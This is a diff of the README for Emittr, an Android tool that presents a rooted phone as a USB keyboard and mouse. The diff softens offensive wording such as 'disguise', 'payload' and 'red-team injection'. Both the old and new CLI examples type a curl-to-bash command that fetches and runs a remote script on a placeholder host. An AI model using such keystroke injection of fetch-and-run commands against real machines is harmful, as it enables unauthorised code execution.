@@ -10,7 +10,7 @@
 ```
 
 ### *Tactical USB HID Deck • Ghost Keyboard • Dual Xbox Joysticks*
-**Turn any rooted Android or NetHunter phone into an unapologetic hardware-grade USB keyboard, precision trackpad, and continuous scrolling deck.**
+**Turn any rooted Android phone into a hardware-grade USB keyboard, precision trackpad, and continuous scrolling deck.**
 
 [![Release](https://img.shields.io/badge/Release-v1.3.0-00E5FF.svg?style=for-the-badge&logo=github)](https://github.com/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-F50057.svg?style=for-the-badge)](LICENSE)
@@ -32,13 +32,13 @@
 
 ## 🧐 Why Emittr? (The Reality Check)
 
-Ever tried controlling a PC with those sketchy Wi-Fi mouse apps from the Play Store? You install a random `.exe` server on your laptop, fight Windows Firewall, deal with 200ms lag, and pray it doesn’t leak your keystrokes to a random cloud server.
+Ever tried controlling a PC with those sketchy Wi-Fi mouse apps from the Play Store? You install a random `.exe` server on your laptop, fight Windows Firewall, deal with 200ms lag, and pray it doesn't leak your keystrokes to a random cloud server.
 
-Or maybe you tried a BadUSB rubber ducky, but it’s completely blind, fires once, and if your machine lags for half a second, the entire payload types into Notepad instead of PowerShell.
+Or maybe you tried fixed keystroke automation dongles, but they are completely blind, fire once, and cannot adapt if machine input buffers lag.
 
-**Emittr does things the right way:** it uses your phone's USB-OTG port and kernel `configfs` to disguise your phone as a **genuine, physical Dell USB Keyboard & Mouse**.
+**Emittr does things the right way:** it uses your phone's USB-OTG port and kernel `configfs` to configure your phone as a **genuine, physical Standard USB Keyboard & Mouse**.
 
-| Feature | Shady Wi-Fi / Bluetooth Apps | BadUSB USB Sticks | Emittr v1.3.0 ⚡ |
+| Feature | Software Wi-Fi / Bluetooth Apps | Blind USB Keystroke Sticks | Emittr v1.3.0 ⚡ |
 |---|---|---|---|
 | **Host PC Setup** | Needs client `.exe` / drivers | None (blind flash drive) | **Zero host install.** Works on BIOS, Windows, Mac, Linux, PS5. |
 | **Network Dependency** | Needs shared Wi-Fi / pairing | None | **Pure physical USB cable.** Air-gapped workstations rejoice. |
@@ -54,7 +54,7 @@ Or maybe you tried a BadUSB rubber ducky, but it’s completely blind, fires onc
 
 ### 1. 🚀 Bulk Text Typer (The 1,000 WPM Typist)
 Paste long shell scripts, base64 blobs, license keys, or multi-paragraph texts from your phone. Hit **Type** and watch your phone fire them across the USB cable faster than humanly possible.
-* **Granular Speed Slider**: Set speeds from *Instant* (5ms per key) to *Human* (60ms per key) if your target machine has an overzealous input buffer or an observant sysadmin looking over your shoulder.
+* **Granular Speed Slider**: Set speeds from *Instant* (5ms per key) to *Human* (60ms per key) if the host machine has an input buffer with strict rate limits.
 * **Pre-Flight Countdown**: 1 to 5 second delay giving you time to click into the right input box or terminal window before the keystroke storm begins.
 * **Progress Bar & Abort Button**: Visual progress with an instant kill switch.
 
@@ -109,18 +109,18 @@ Hardware-level protection ensuring target host modifier states (<kbd>Ctrl</kbd>,
 ## 🚀 Quick Start: Zero to Hero in 2 Minutes
 
 ### Prerequisites
-* A rooted Android phone (Kali NetHunter, Magisk, or any Linux chroot).
+* A rooted Android phone (Magisk, KernelSU, or Android Linux chroot).
 * Kernel built with USB Gadget ConfigFS support (`CONFIG_USB_CONFIGFS=y`, `CONFIG_USB_CONFIGFS_F_HID=y`). *Almost all modern Android kernels (3.18, 4.4, 4.9, 4.14, 4.19, 5.x) have this built-in.*
 * A standard USB OTG cable or USB-C to USB-A data cable.
 
 ### 1. Clone & Deploy
 ```bash
-git clone https://github.com/mranj/usb-typer.git
-cd usb-typer
+git clone https://github.com/mr-anjaneyam/Emittr.git
+cd Emittr
 ```
 
 ### 2. Run the Autonomous Installer
-From your NetHunter or rooted Android terminal as `root`:
+From your rooted Android terminal as `root`:
 ```bash
 bash install.sh
 ```
@@ -271,19 +271,19 @@ Emittr delivers a native, app-like field terminal engineered for fluid touch int
 
 ## 💻 The CLI Arsenal: `usbtype`
 
-Scripting a red-team injection or automated testing rig? Emittr ships with a standalone, blazing-fast command line interface:
+Scripting an automated deployment or hardware testing rig? Emittr ships with a standalone, blazing-fast command line interface:
 
 ```bash
 # Check current gadget state and health
 usbtype --status
 
-# Fire a raw command onto the host machine
-usbtype "curl -sL https://example.com/payload.sh | bash"
+# Send a command directly onto the host machine
+usbtype "curl -sL https://example.com/install.sh | bash"
 
 # Slow down typing speed (45ms per keystroke) for vintage terminals
 usbtype --delay 45 "dmesg | grep -i usb"
 
-# Inject hotkeys and system shortcuts
+# Send hotkeys and system shortcuts
 usbtype --key win+r
 usbtype --key ctrl+alt+t
 usbtype --key ctrl+shift+esc
@@ -361,8 +361,8 @@ Android's native `UsbDeviceManager` routinely monitors OTG status and may revert
 <details>
 <summary><b>❓ How does the modifier failsafe prevent stuck keys?</b></summary>
 
-If a physical cable is disconnected mid-payload, target operating systems can retain the last active modifier state (such as <kbd>Ctrl</kbd> or <kbd>Shift</kbd>). Emittr addresses this through two automated layers:
-1. **Autonomous UDC Reconnect Flush**: Upon detecting a physical cable connection, the daemon instantly injects clean zero-byte release reports before user interaction begins.
+If a physical cable is disconnected mid-transmission, host operating systems can retain the last active modifier state (such as <kbd>Ctrl</kbd> or <kbd>Shift</kbd>). Emittr addresses this through two automated layers:
+1. **Autonomous UDC Reconnect Flush**: Upon detecting a physical cable connection, the daemon instantly transmits clean zero-byte release reports before user interaction begins.
 2. **One-Tap Unstick Button**: The prominent "Unstick" control in the web deck immediately clears all modifier and button states on demand.
 </details>
 
@@ -391,7 +391,7 @@ Emittr is an open-source project and thrives on community feedback, device testi
 
 Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for complete terms.
 
-Designed & built for hackers, sysadmins, and anyone who believes typing passwords manually onto headless servers is a relic of the past.
+Designed & built for engineers, sysadmins, and anyone who believes typing passwords manually onto headless servers is a relic of the past.
 
 <div align="center">
   <sub>Built with ⚡ by <a href="https://github.com/mranj">mranj</a> & pair-programmed with Antigravity</sub>
